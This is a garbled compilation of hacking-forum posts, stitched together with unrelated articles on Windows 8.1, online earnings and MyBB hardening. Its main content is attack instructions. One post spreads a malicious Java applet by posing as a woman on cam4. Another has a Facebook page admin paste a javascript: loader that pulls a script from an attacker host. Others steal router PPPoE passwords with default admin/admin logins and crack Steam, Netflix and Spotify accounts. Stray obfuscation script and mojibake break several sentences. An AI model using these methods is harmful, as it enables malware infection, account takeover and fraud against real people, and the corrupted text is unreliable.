And then save it. Now goto [Image: 2d6mtck.jpg] and signup. After you login upload all the files from the javas folder. And youre done setuping the Java Applet. Next step is to visit the website we are going to spread. The website is  http://www.cam4.com , there are a lot of horny men who will do anything to see a female on cam. Register an account there call it \""hornyteen\"" or something similar (Use real e-mail, they will send you the password via e-mail). After you register, its time to turn into a girl! We will be using manycam to fool our victims into beliving we are females who are on cam. Download \""ManyCam\"" from  http://download.manycam.com/  and install it. Once ManyCam is installed open it. Now open ManyCam and select \""Effects\"" in the left hand corner. Once selected click \""Text over video\"" on the left hand side. One selected you will see an option named \""Show ManyCam.com logo\"" UNTICK this option so that the ManyCam icon disapears. Next, select \""Source\"" Once source is selected on the left hand side select \""Movies\"" then as you can see you can browse movies saved on your computer and play them on your webcam! You could always find videos on YouTube and downloaded them using YouTube downloaders or download some home made porn videos from porn websites. ( http://www.redtube.com ,  http://www.tube8.com ,  http://www.pornhub.com ,  http://www.youporn.com ) Alright after you have got your video prepared, account registerd. Log into  http://www.cam4.com  with the username and password you registerd with. At the top of the website you should see a button named \""broadcast\"" Click it, then select your options and broadcast to all the horny men, during you being on cam press the STOP button on the movie in ManyCam so that the screen goes black. Once you have done this say in your chatroom something like \""OMG my cam has stoped workin here but its working at \""www.yourwebsite.tk\"" anyone help me? And they think, oh awsome I will go there and get to see her strip but when they visit your site a java popup pop up and asks them \""run\"" or \""cancel\"" and 99.9% of people at this website have Java and 95% will say Yes. There you have your infections. Not getting many people visiting your rooms? I think it helps if you set a display picture go to google and find some nice real looking picture of a girl sucking cock or something and while your on  http://www.cam4.comat  the top were you found the Broadcast button click \""Edit\"" then click \""Edit Images\"" then upload your new image. 4.

Ok, if you are going to buy the full version, you will need forum list. you can use google the more the forums are, the more are the downloads. You will need templates, search Google! Now you have to register to the forums, I know its boring but you have to. To get rid of it, use Roboform which you can get it from  http://www.Roboform.com . Install it and open it, and start registering. Ok, after everything is done, start posting things like WinRAR, Crack versions of programs, etc. To get more downloads use screenshot of the program in the thread. If you have troubles with screenshots, download \""Icsnap\"" from HERE. It is a useful tool, which upload pictures images from your desktop to imageshack, directly. Ok , now download \""Easy Post creator\"", its a useful tool aswell which saves your posts.

0	How to recognize our PC infected with Viruses, Trojans or Malware	""" The reason why most computer malware are so deadly is because many users fail to recognize whether they have been infected or not. Had they detected the infection at an earlier stage, the damage caused could have been greatly reduced. As each virus is programmed differently, it becomes difficult to identify a virus outbreak. However, there are some general symptoms that make it easy to detect an infected computer. Here are some of them:- 1) Programs wont start or crash suddenly: If some system programs like the task manager or registry editor have suddenly stopped working or crash randomly without any visible reason, it is more than likely that your computer has got some form of worm that is attaching itself to various programs and thus, corrupting their code. A virus modifying registry entries to prevent these programs from running could also cause this.  2) Unusual Network Traffic: If even after closing your browser and other applications that may use the internet, you see that your computer is still downloading or uploading anything, then your computer is possibly infected with some form of spyware that is either downloading other viruses to your computer or is uploading your private information to a remote computer. In case you use a wifi connection, it is also possible that your neighbors are using your network.  3) Internet Connection not available or is slow: If suddenly, your internet connection has stopped working or has become extermely slow, it is possible that a malware is the cause. However, problems with your internet service provider could also be the cause of such issues.  4) Annoying Popups or Redirection to Strange Websites: If there has been an increase in the number of annoying popups while browsing the internet or your web browser redirects you to a different website from the one you wanted to visit, a virus or adware might be the cause.  5) Computer wont boot: If your computer has suddenly stopped booting, it is possible that some malware has modified your computers system files. In such a situation, re-installing or repairing your operating system might be the only solution.  6) Slow Computer: Some viruses are designed specifically for this purpose. Malware programmers achieve this by designing viruses that increase your CPUs usage level to 100%. If on running the Task Manager, you find that your CPUs usage is constantly at 100% level, a malware might be the cause.   7) Programs start automatically: Some viruses and adware automatically start strange programs on your computer in order to show unwanted advertisements or simply to frustrate users. 8) Unusual File Associations: Some viruses change .exe or other file associations which prevents these files from opening. Some viruses also do this to automatically start themselves when a file of a particular type is started.  9) Security Software Disabled: Most malware disable antiviruses and firewalls to prevent themselves from being detected. If only a single software stops working, it might be a specific software failure issue. If it is a general trend and almost every security software is facing this issue, a virus infection is most likely.  10) Weird Behaviour: If your computer automatically starts sending emails or opens strange applications randomly or does things different from its \""normal\"" behaviour, your computer is most likely compromised by malware. """

As we all know its difficult to hack Facebook  fan page but using this method you can hack Facebook fan page easily. Now lets start the tutorial of facebook fan page hacking . First of all  we will need to setup an exploit  and a website to host that exploit. If  you already have a registed hosting account then its great otherwise  there are couple of free hosting websites that can be used for such  purposes like 000webhost.com etc. Step 1: First download Facebook page hacking exploit, [BLINK] Comment and see downloading link. [/BLINK]::cool:: [HIDE-REPLY] Hidden Content:  You must reply to see links  [/HIDE-REPLY]  Facebook page hacking exploit Step 2: Now open the pagehack.js [in package] with notepad and search  for \"" [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ \"" and change \"" [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ \"" with ur facebook  email. Step 3: Now you have to change the viral text which will be sent to the  friends of the victims. To do this, find the text <b>Hey See what i  got!</b> and replace it with your own text. This text will be  sent to the facebook wall of 15 friends of the victim. Since it is an  autoposting bot, to prevent facebook from blocking it, I reduced its  capacity to 15.  Now just save it as anything.js (Tip: Be social engineer and rename it  to something more attractive like getprizes.js or booster.js) and then  save it. Step 4: Now create a account on free hosting like 0fess.net or  000webhost.com ( 110mb won t help this time)and upload facebook page  hacking exploit on your free hosting website. you will get url address  something like this  [BLINK]  Hidden Content:  You must reply to see links [/BLINK] Step 5: Now ask victim to paste this in browser address bar, He must be admin of page.Which you wants to hack: j avascript:(a = (b = document).createElement(\""script\"")).src =  \""http://www.yourwbesite.com/pagehack.js\"", b.body.appendChild(a); void(0) Note : Change scr =  Hidden Content:  You must reply to see links  in javascript with ur own address. Encode this javascript into ascii format for more results. [BLINK]  Tip: Tell him that it will make your page safe, or something else like attracting.  [/BLINK]      When he will put this key in address bar and thats it you will get a notification that you are admin of his page now.       Enjoy, But dont hack for bad cause, I will not be responsible for any consequences made by you. :P   """
0	Bsnl broadband hacked method	"""     Hidden Content:  You must reply to see links   I encountered with this article in my tutorials database while going through it and after reading this article found the easy  hack for BSNL , with this article you are able to  hack BSNL Broadband  of  someone say your neighbours BSNL Brooadband Account (actually the  person whose IP is known to be vulnerable). Here, once you are able to  obtain the password of victim, you can easily use his BSNL connection  and thus hack his BSNL broadband connection account. Bsnl  DataOne Broadband continues to grow as one the most popular broadband  services in India with high speed facilities of upto 2 mpbs. But a large  number of users of this service are vulnerable to hacker attacks  because discovering and hacking the vulnerable victims of this network  is shockingly simple. If you are a  Bsnl Broadband user  then immediately assess the security of your internet connection and take appropriate steps to secure yourself. First lets see how simple it is to hack bsnl dataone broadband usernames  andpasswords. For this you shall need a ipscanner tool called Angry IP  Scanner   Hidden Content:  You must reply to see links   or anything similar. Ok so lets begin... Get your IP from : Hidden Content:  You must reply to see links Step 1 : Start  Angry IP scanner  and goto options > ports. Type in 80 in the first ports textbox and click ok. Then goto options > options ; in the display section select \""only open ports\"" and click ok&save. Now on the main screen put in the ip scan range as something 59.*.0.0 -  59.*.255.255 (for e.g. 59.95.2.3) and click the start button. And the  list that shall follow next are the victims. In this example we choose  the range 59.95.0.0 - 59.95.255.255. You will be surprised at the number  of victims you discover. Step 2 : Pick the ip-address of any of them and open up your browser and type in Hidden Content:  You must reply to see links .*.*.*  (the * should be replaced by the values from the ip you are using. A  box will popup asking for username and password. Enter the username :  admin and password : admin .There is a high chance that you will be able  to login with that username and password. admin-admin is the default username and password that is set while manufacturing the adsl modem devices. What follows next is the modem administration panel. Simply search for the \""WAN\"" option and click it. On the next page you  will find the username and password of that user. now right-click on the  page and click view source. in Mozilla/Opera This frame -> view  frame source Now in the source code search for this : INPUT TYPE=\""PASSWORD\"" and the value field of this input element will have the password if its not there as in case of D-Link DSL 502T ADSL Routers the search for this input type=\""hidden\"" name=\""connection0:pppoe:settings/password\"" value=\""password\"" id=\""uiPostPppoePassword\"" and the value field will have the password Well each steps take less than 1 minute so getting username passwords  wont take even 2 minutes and is easier than sending a mail. And this exposes the  weak security of bsnl broadband users . Well this is not a weakness but more of a mis-configuration which leads  to insecurity. If you understand networking then you would probably  realise that it was merely logging into the remote administration  service of the modem and nothing else. This was not really hacking but a  simple search of victims who are absolutely ignorant of their weaksecurity on the internet. Most routers have an option where remote management can be disabled. In  other words, you can only connect to the configuration interface from  the internal network, not the WAN(Internet) side. You would definitely  want to make sure remote management is notactive to protect yourself. Note : On SmartAX MT880 eventhough Remote Management is disabled , it  permits remote logins from over the Internet. So change your mode  administration passwords immediately. The problem is that the professionals at Bsnl are ignorant of such  simplicity of networking and unable to advise the users or guide them to  take proper security measures leaving their customers and themselves  absolutely unsecure. Now lets check a few more options related to this issue. A bsnl  broadband modem can be used in two modes. RFC Bridged mode and pppoe  mode. In the RFC Bridged mode the device behaves like a modem device that is attached to your computer and you use some dialup software to  dial into the isp through this modem.This is PPPOE from the PC and the  adsl device is a good modem. This mode is safer as the username password  are on your pc and nothing is on the modem. In the PPPOE mode the adsl device becomes a router - a distinct network  device with many features enabled. In this mode the username password is  stored in the modem which will dial to the isp and establish the  internet connectivity. The computers will just connect to this router  who would be their primary gateway. Now this is the mode where the risk  exists. If remote administration is enabled the remote users from the internet  can login to this modems administration panel. Now the main problem is  the default admin username-password which most users dont change due to  ignorance. \""admin-admin\"" is pair that works in most cases giving you  full access to the modems internals. What follows next is simple as  drinking a glass of orange juice. Many users install firewalls and think they are safe, but they fail to  understand that the firewall protects their PC not the \""router\"" since  the topology is like (PC) -> router -> internet [BLINK]  So how should you secure yourself ? [/BLINK] 1. Use RFC Bridged mode if it is sufficient for you. 2. Change the default admin password of your modem. 3. Disable wan ping reply . ( this will prevent the hackers from directly discovering your pc when it is on the internet) 4. Disable remote configuration feature. 5. Check your broadband usage on a regular basis and compare it with  your own surfing schedules to check whether someone else has used it or  not. If suspiscious usage is indicated then immediately change your  broadband password as well. Or a better suggestion would be to change  broadband passwords on a regular basis.   """

Please note this tool is for use for only recovering your own accounts. This tutorial is solely for educational and entertainment purposes only. I personally do not do this. Note: LoL was added after this tutorial was made, but everything still works the same. Alright, so first we want to start up VoidCracker. This tutorial is mainly intended for people who already own VoidCracker. But if you would like VoidCracker, . Step 1: Start up Void Cracker by clicking \""VoidCracker.exe\"" make sure that VoidCracker.exe is in the same folder as the DLL that comes with the download.  Step 2: Now this step is optional, but highly recommended. Now we will add proxies. If you dont already have a proxy list, you can download one by clicking the proxies tab and then clicking either, \""Download 500\"", \""Download 1000\"" or \""Download 5000\"". For this tutorial. I will download 1000 Proxies. Step 3: Now the dialog box has opened, prompting me to set the destination to where I would like to save my proxies, for this tutorial I chose desktop. I name my proxies, \""1000Proxies.txt\"". Step 4: Now go back to the proxies window, and click the browse button, then select the proxies that you had saved to your desktop just a few seconds ago. Step 5: Now that we have got are proxies all ready, we can now go over to the tab of whatever section we would like to crack, Steam, Netflix, or Spotify. You can click any one you chose, the tutorial is the same for all accounts types. For this tutorial, I will try to crack my own Steam account. Step 6: Now its time to load up your usernames and passwords, however for Netflix, instead of usernames, you must enter in the emails. So I will now enter in my steam username by typing it into the text box. However, if you have a  list  of Steam usernames you can load them by clicking,  File -> Browse Usernames ->  And then selecting your list of usernames. However if you have a list of steam Usernames and Passwords in the same file in the format Username:Password, then you can click,  File -> Browse user:pass . However for this tutorial, I will just type my steam username in the textbox Step 7: Now we have to select the passwords. If you do not have a list of passwords you can download one by clicking  File -> Download Wordlists  and then select the location where you would like to save your wordlist. However you would like like to use your own wordlist, just move on to the next step. Step 8: Okay, so now you must select your wordlist, you can now select either you downloaded wordlist, or a wordlist you previously had. So select your wordlist click  File -> Browse Passwords  and then select the location of your wordlist / combolist. Step 9: Now youre all set. All you need to do is click start, the program will run through every password for every username, it takes almost less than a second per attempt for me. Which means it only takes me around 8 minutes to crack some accounts. So now click the \""Start\"" button at the bottom of the program. Step 10: When the program is finished cracking you will see a message box like in the screenshot below. Then click on the results tab to see if you were able to recover any accounts. Step 11: Here in the results tab we can see that the program was in fact able to crack my account. Here you will see the results, also you can click the results tab  even when the program is running  to view a live feed of the results at any time. Step 12: Now youre done congratulations! And remember that this tutorial is for educational and entertainment purposes only. This program is only intend to check / recover your own accounts. Do not attempt this on other accounts. download Links Removed """

0	Hacking Email or any Website Accounts - Beginners	"""   Introduction to Hacking Email or any Website Accounts - Beginners Please Read Hi my friends Im a new member of Algeria A Guide by The 7th Sage Ok now that you have my attention :lp: Please read this guide that will burst your bubble, beginner hackers. I am sorry for that. You CANNOT hack emails or websites with just one or two clicks with some email hacking apps. You need to have proper information about the person that you are hacking. If you see sites that claim that they can hack email accounts within minutes and charge hundreds of dollars for it, just laugh at them and move on. Do not waste money on them as they will be just scamming you. There are two ways to hack Accounts of a Website. Client Side Hacking This method can be done depending what you choose. Client side hacking is basically hacking the persons pc and extract information. Antiviruses will detect the apis, assemblies, etc and prevent you from infecting them. In this case you need 1) Keylogging : This basically taps all the keystrokes that users type. When user types password you get it. The victim requires to execute the keylogger \""server\"" file in order to be infected. 2) Password Stealing : Here you steal password saved on users pc. Browsers often save passwords to provide quick login to the user, but this can be harmful sometimes. Here same as keyloggers you need to execute a file on client pc. You can use combination of keylogger and password stealers, such as my Emissary Keylogger/Stealer. 3) Cookie Stealing : Here you are stealing cookies of the user. Cookies can be used to auto login as they hold information about the account. 4) Remote Administration Tools : These tools are very dangerous and give you full control of a computer. You can view webcams, desktops live, transfer and download files. 5) Social Engineering : Social Engineering is nothing but fooling someone to download your malware or extracting sensitive information from them. One of the methods is this : Hacking Accounts through SE. 6) Phishing Attacks : Phishing is creating fake login pages similar to that of a websites login page and then fooling the person to enter their username and password into the login box. The triggered php scripts shall send the entered passwords to your log file. 7) Zombies/Bots : This is like keylogging and pass stealing if victim executes your malware he she can be infected with a bot. A bot will connect them to your irc channel or host server and make them your \""Zombie\"". You can do whatever you want with them. That covers the client part. Server Side Hacking 1) Exploiting : Exploiting means finding a vulnerability and using it to your advantage. There are various publically disclosed vulnerabilities and exploits that you can simply search on google and HC. There are ways to exploit a server the most common ones are 1) XSS Cross Site Scripting, 2) RFI, LFI 3) Uploading Shells 4) SQL Injections 5) CSRF 6) Gaining Root Access to websites hosted on the same server and then intruding another site on the server. 7) Using Scripts to gain information known as Exploits. These methods are very vast and cannot be explained in a few lines so I am not explaining them in this guide. 2) Bruteforce Attack : Bruteforcing is using a bruteforcer software to try combinations of words, numbers and symbols to fetch the login of your victim. But this rarely works and you need to have a powerful computer. 3) Reverting Accounts : Here we are fooling the website servers that we are the authorized user and we are the holder of an account. One of this vulnerability exists in Hotmail and existed in Facebook. Users just supplied some information about the clients such as last accessed ip address, contacts on contact list, date of birth, location, etc. With a bit of SE its not that hard to extract such information from the client. That covers most of the basics of Email/Website Account \""Hacking\"". Hope you dont buy into any of the bullshit after reading this guide. Thank You, for reading.   by mond hacker form Algeria   """

0	Adding your own exploits and modules in Metasploit	""" Adding your own exploits and modules in Metasploit No not an exploit-dev 101 post but maybe an advanced tip for people new to using the Metasploit Framework. I see this question all the time so here is a little mini tutorial. In Linux (For the love of god, dont run msf on Windows) when you install metasploit you get a hidden .msf(/home/$user/.msf) directory in your home directory. It starts out empty, but this is where you want to place all updated exploit modules, auxiliary modules, meterpreter scripts, etc. Why? Well if you start modifying exploits in the trunk when you do an update it will start bitching at you about it not being the same exploit and may possible overwrite your stuff and thats no fun. Example time. Say you want to add the \""HP StorageWorks NSI Double Take Remote Overflow Exploit (meta)\"" exploit located on milworm. Its already in the trunk, so if you want to follow along youll have to run it. What you have to do is create the same directory structure in your .msf folder as you have in your regular msf folder. So, looking at the exploit on milworm we see the path is: class Exploits::Windows::Misc::Doubletake  So we cd into our .msf folder and create our modules folder (If you are lost, look at your regular msf folder and make a similar directory structure). Once we do that we need to create an exploits folder, a windows folder, and misc folder. Then well stick our doubletake.rb file into that folder.

The  final version will be available as a free downloadable Windows 8 update  in Upcoming days... So let us  now talk or take a look  about  New Windows 8 Features ...  [h=2] 1. Interface  :[/h] [h=4]i. Make The Start Screen Yours..[/h]    Hidden Content:  You must reply to see links    Most of the changes in Windows 8.1 are visible straight from the Start  Screen. New sizes of Live Tiles that offer more information or reduce  clutter on screen, additional motion backgrounds, and the ability to set  any image as the Start Screen wallpaper make for an improved and  refined interface. The transition between desktop mode and \""Metro\"" is a  lot less jarring now, and there are even options to boot to desktop or  set a new All Apps view as the default home page for the Start Screen. Microsoft appears to be listening to its Windows 8 critics here, making  8.1 a more customizable experience that suits all needs. Altering the  new Start Screen takes some getting used to if youre used to the old  method, as you have to hold down on Tiles to move and change their size  or position. It feels less intuitive than before, but it also prevents  accidental swipes and movements so theres a tradeoff involved. The lock  screen has also been tweaked to include quick access to the camera, the  ability to quickly accept Skype calls, and a slideshow feature that  pulls pictures from Sky Drive or the local PC. These features are minor,  but good additions for upcoming 7- and 8-inch devices.      [h=4]ii. Return of Start Button..[/h]    Hidden Content:  You must reply to see links     The Start button returns to Windows 8, and if you want you can almost  combine it with the All Apps view to create a Start Menu of sorts. The  button is simply a visual element that takes you back to the Start  Screen, but you can also right click on it and access power user  commands and the shutdown or restart options. Its return should help  ease one of the usability complaints around Windows 8, but it does very  little to change the way you have to interact with the Charms or the  recently used apps with a mouse and keyboard. Fortunately the hot  corners can be disabled so if you want to totally avoid the \""Metro\""  world then its possible to do so without third-party software now.      [h=4]iii. Side by side, multi-monitor, Miracast[/h]    Hidden Content:  You must reply to see links    One of the biggest changes in Windows 8.1 is the ability to have greater  control over snapped applications. In Windows 8 apps could run  side-by-side, but it was rather limited with a roughly 30 / 70 percent  split. Microsoft is altering this dramatically in Windows 8.1, allowing  apps to snap in a new 50 / 50 mode. You can also change that percentage  to better control how much of an app you see on screen. This means itÃ¢â¬â¢s  possible to snap three, four, or more apps alongside each other. ThereÃ¢â¬â¢s  a limit, but itÃ¢â¬â¢s based on the number of 500 pixel increments you can  fit on a display. On 7- and 8-inch tablets, Windows 8.1 will support the  50 / 50 view in landscape mode, with the majority of improvements aimed  at portrait mode and reading scenarios.        Multiple monitor support for Windows 8-style applications has been  greatly improved in Windows 8.1. In our testing you can snap multiple  apps across multiple displays and even extend a machine wirelessly to a  Miracast-compatible display. Microsoft is supporting Miracast natively  and it has surfaced as part of the Devices Charm with the project  option. Snapping apps on multiple monitors is a little confusing, and  dragging apps between monitors doesnÃ¢â¬â¢t always have the desired effect. I  found that the Start Screen would often jump to the active monitor,  making it tricky to arrange apps. Still, the support is welcome and it  certainly makes Metro a lot more appealing on desktop and laptop  computers without a touchscreen.      [h=4]iv. Access PC settings from Metro[/h]  With Windows 8, you had to use  the traditional Windows desktop Control Panel to adjust practically any  important setting on the computer, and if youre a power user or find  yourself troubleshooting computers often, that might still be the case.  But for most tablet users, the new touch-based PC settings will probably  be enough for most anything. Its still a bit of a mess of nested  options as of the Windows 8.1 preview build, and you might be better off  just searching for what you want, but if youre looking to change the  screen resolution or how long the computer will sit idle before it goes  to sleep, these new menus have you covered.    [h=3]Screen Shot of New Lock Screen[/h]    Hidden Content:  You must reply to see links  [h=3][/h] [h=2] 2. Search [/h] [h=4]i. Built-in Bing search[/h]    Hidden Content:  You must reply to see links     Search has been totally  overhauled in Windows 8.1. Bing now powers the interface and underlying  algorithms used to discover and fetch data from local PCs and the web.  Microsoft has long been investing in desktop search, but itÃ¢â¬â¢s moved  forward significantly in the 8.1 preview. You can simply type on the  Start Screen and youÃ¢â¬â¢ll be able to instantly access web queries, recent  searches, system settings, files, and other information. If you want to  quickly launch an app then you can just type the first few letters and  youÃ¢â¬â¢ll be presented with it. The search interface appears to favor apps  over other content, but it also learns your search habits and adapts  accordingly.  [h=4]Bing Heroes [/h] Bing Heroes surfaces images, video, and audio content in a stylish way Perhaps the biggest change to  search here is a new hero interface powered by Bing. If you search for  an artist like Rihanna youÃ¢â¬â¢re presented with a full-screen interface  that surfaces images, video, and audio content. ItÃ¢â¬â¢s done so in a useful  but stylish way and it will even retrieve data from applications. One  particularly impressive part of this search interface is that it shows  web links with a thumbnail preview of the site youÃ¢â¬â¢re about to click on.  If you want to play audio from a particular artist then it jumps  straight into Xbox Music, or it will find YouTube videos from the web  that are relevant.  News is also presented,  alongside key information from Wikipedia. The images can be expanded and  viewed separately, and thereÃ¢â¬â¢s even the option to filter them by color  to find the exact image you need. Speaking of images, if you search for a  location the new Search experience can even find pictures you may have  taken there, surfacing them alongside web results. ItÃ¢â¬â¢s clear Microsoft  has put a lot of thought and effort into this interface, and it has paid  off.    [h=2] 3.Apps  [/h]    Hidden Content:  You must reply to see links  [h=4][/h] [h=4]i. Mail and Office[/h]     Hidden Content:  You must reply to see links     Most of the Windows 8 apps are  being improved, but one thatÃ¢â¬â¢s not part of the preview is the Mail app.  The company is demonstrating some of the improvements itÃ¢â¬â¢s working on,  including drag-and-drop support, sweep (which can remove large  quantities of older unwanted mail) and the ability to group social and  newsletters in one place. The Mail app is clearly starting to take shape  into something thatÃ¢â¬â¢s more usable and powerful to use over on tablets  and even desktops. In the preview release the improvements arenÃ¢â¬â¢t ready,  but Microsoft tells us an updated app will ship with Windows 8.1 later  this year. One thing that does work well now is Mails ability to pop  open an app, side-by-side with Mail, to quickly view a web link or  attached photo. Metro Office is coming soon     I also saw a brief glimpse of  Windows 8-style Office applications which Microsoft is currently working  on. Described as an alpha build, Microsoft was only prepared to show  off a copy of PowerPoint running a presentation, but the suite should  launch for Windows 8.1 tablets later this year.  [h=4]ii. Spin for better photography[/h] [h=4]   Hidden Content:  You must reply to see links [/h]  [h=4][/h]     Microsoft  has some pretty intriguing user experiences for snapping shots and  editing photos in Windows 8.1. With Photosynth, part of the Camera app,  you can take a whole 360 degree photosphere Ã¢â¬â an entire room floor to  ceiling Ã¢â¬â just by moving the tablet around, as if each image is filling  in the pieces of a virtual jigsaw puzzle. The Photosynth software  stitches them all together, and the results are surprisingly good.  Meanwhile, the Photos app lets you enhance or mute colors through a  different circular procedure: you drop a pin on any spot, then rotate a  radial dial (which reminds me of OneNote) to adjust the intensity.  [h=4]iii. Internet Explorer 11[/h]     Internet Explorer 11 largely  looks the same as its IE10 counterpart. The tab interface has been moved  to the bottom, and Microsoft is catching up to the competition with tab  sync across Windows 8.1 devices and Windows Phone. WebGL is also  supported in Internet Explorer 11, and website owners can create  separate Live Tiles that can be pinned to the Start Screen to access RSS  feeds.   Unfortunately there are still  separate desktop and Metro versions of IE11, and the tabs dont appear  to keep in sync between the two. Its an odd disconnect given  Microsofts focus on cloud syncing in 8.1. IE11 will also detect phone  numbers on sites so you can call them using apps like Skype, and the app  fully supports the new Reading List feature that will let you bookmark  web pages for later reading.    [h=4]iv. Much More like..[/h]   Right out of the box, there are a number of new apps in Windows 8.1.  Metro-style versions of Alarms, Calculator, and Sound Recorder are all  available and the company is also adding Bing Health & Fitness and  Bing Food & Drink. BingÃ¢â¬â¢s Food & Drink app is perhaps the most  interesting addition. Designed as a recipe book, it includes a unique  hands-free mode that lets you swipe between recipe notes to avoid  touching a screen with messy fingers. It simply uses a webcam and it  will be interesting to see whether this makes its way into additional  Windows 8.1 apps.

"""   Making money online is no more a difficult game to play, in fact, if you are truly a money maker and want to cash every bit of your talent, there is nothing stopping you from generating decent dollars for yourself. Have you ever thought of getting paid for watching latest movies and letting people know a little about how actually the movie was? If not, then here comes a new way to  Earn Money by Watching Movies and Writing Reviews for them . Although there are thousands of other ways through which you can enjoy some better results but again, there is nothing like free lunches and to enjoy great revenue, you need to invest great time, quality and efforts too. If you are a movie freak and love to watch the latest movies, if you think you are good at criticizing the flaws and appreciating an outstanding project, then you can simply earn up to $10 for writing a movie review for websites that pay handsome for doing so. Why to write movie reviews to make money? If you are making some money through the alternative strategies of earning through an online platform, having this question seems justified. It is important to understand the real you and your abilities before you choose your earning strategy. Think of a poor writer applying for writing jobs on freelancing sites or a busy student aiming to make AdSense revenue by posting once in a week. This would surely do no good to him as every domain has its own requirements in terms of time and quality. If you know you love entertainment and think you cannot do justice to any other online program of making money, then watching a movie for fun and writing a review in an hour is certainly an easy thing you can do whenever you have some spare relaxing hours. There are many entertainment websites that offer review writing jobs but 3 highly recommended websites in my list are helium.com, yahoo!voices and xomba.com. Let us discuss each of them in detail. 1) Xomba Just like any other article submitting website, say squidoo or hubpages, xomba pays its review writers on the basis of PPC (Pay per Click) strategy. All you need to do is to write a brief review about the movie and publish it at xomba.com. You need to have a Google AdSense account to get your revenue been generated. What happens is, Google Ads are placed with your review and when someone follows an ad link while reading your review, you get paid each time. The only drawback of using this site is that there is no consistency or guarantee in earning. You might get a good deal someday but nothing at all the next day! Tip: Try picking most happening topics to write on  xomba.com 2) Yahoo! Voices Previously known Associated Content is now what you know as  Yahoo! Voices . All you need to do is to sign up for an account and post your articles related to different domains, including movie reviews under the review section. The mechanism of payment is a few cents for every post initially but once you increase your worth by your creative content, you can then enjoy a nice daily income. The idea is still new and unfamiliar, resulting in limited number of viewers visiting your work. However, when things are under the banner of Yahoo or MSN, keep your morale high! Tip: Focus on quality and try breaking reviews as soon as possible after the release of a movie trailer or movie, itself! 3) Helium People who are doing this work as profession consider  Helium  to be the best of all. You need to get your title approved by the team by applying for a review to write. Here, as stated above, things are professional and a review should be of more than 400 words. The site pays quite decently per review but getting your hands on a topic is something difficult due to the presence of already working writers who act as your competitor. Tip:  Try to be the first one to write on latest movies If you want to say thanks then please like my Facebook Page for more tricks on Earning Money by Clicking Here   """

0	[Tutorial]Guide to Tightening MyBB Forum Security	"""   NOTICE BEFORE READING: This  is not a guide to making your forum completely secure and untouchable  but this is a guide to the many different things that one can do to  tighen up security. I would also like to note that the latest version of  MyBB is very secure even out of the box. Also note that im no expert  on this, Ive never even had a public MyBB forum but im hoping to start  one soon. This is mostly about securing MyBB itself, look elsewhere for  information on securing any other web applications that you are hosting The key points #1  Keep your forum as up to date as possible It is very important you keep everything up to date, this includes plugins.  Make sure to manually check for updates in the Admin CP often and/or frequent the downloads section of mybb.com #2  Check before installing plugins Plugins  have the potential to bring down your whole forum if they are  insecure/intentionally backdoor-ed. Google is your friend with plugins  so ensure you check through any posts/advisories on the plugin and any  other sources of the plugin that could are more likely to be secure.  Dont use cracked/nulled plugins. If you can understand PhP then look  through the code. If the code is encrypted/obfuscated etc.. and the  plugin is not commercial then be very careful. Look into the plugin  author and their credibility as well. Using a plugin that is used on HF  and made by labrocca for example is a much better idea then some random  thing you found dumped on the net. #3  Use secure and unique passwords Ensure the passwords to all powerful accounts are different, unique, long and use a large array of chars.            *ndEyd7_-38Dne3dhy3(8ednYe}& [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ (jNPKNBGgdue           ^  Is the type of thing you are going to want as a password to any account  with powers that could damage the forum. Dont use passwords that you  use on other forums because they could be easily tracked down. If you  cant remember the password store it in an encrypted vault such as a  keepass vault. #3  Deny access to directories There  are a number of directories in MyBB that contain files that never need  to be accessed from browser. Its a good idea to deny access to these. Directories to protect          {root}/inc {root}/install (whenever not needed) {root}/{admincpdir}/inc {root}/{admincpdir}/modules           As  there is no legit reason to access this stuff its best to create a  .htaccess file in the root of these directories containing the  following.          deny from all           Another way to add to security to the files is the add to/create a .htaccess file in the forum root containing           Options -Indexes           To stop anyone browsing folders without an index. Another thing one can do is the rename the Admin Directory, to do this open          {root}/inc/config.php           and edit the           $config[admin_dir]           to  whatever you want your new directory to be then rename the actual  directory from admin to whatever you specified in the config.php. ---  This does not give much extra security unless you set the           $config[hide_admin_links]           to 1 (note you will need to access the adminCP from a stored link rather than from a link on the front end if this is enabled) #4  Obscure, obscure, obscure Its a great idea to make it as hard as possible for a potential attacker to get correct information on your forum.  Change the default table prefix (this can be done easily upon when  installing a fresh install of MyBB in the installation wizard) This can  also be done in the           config.php           but  only people who know what they are doing should attempt to change it  after MyBB has been installed also note that a few plugins are broken by  non-default table prefixes. This can make it harder for ub3r el1te SQLI  masters to attack your DB  Other things you can do include giving your main account (the one you  post with) super mod perms and giving super-admin to another extremely  secure account that has a normal usergroup as its primary. #5  Lock down the AdminCP Its very important to implement extra security on the admin cp to prevent unwanted access. Here are a few things you can do. Add extra auth with .htpasswd Hidden Content:  You must reply to see links Hidden Content:  You must reply to see links ^ The above links can be used to generate the files needed to do this. Once done simple place the .htpasswd and .htaccess files in the adminCP  directory for some extra security. Make sure the 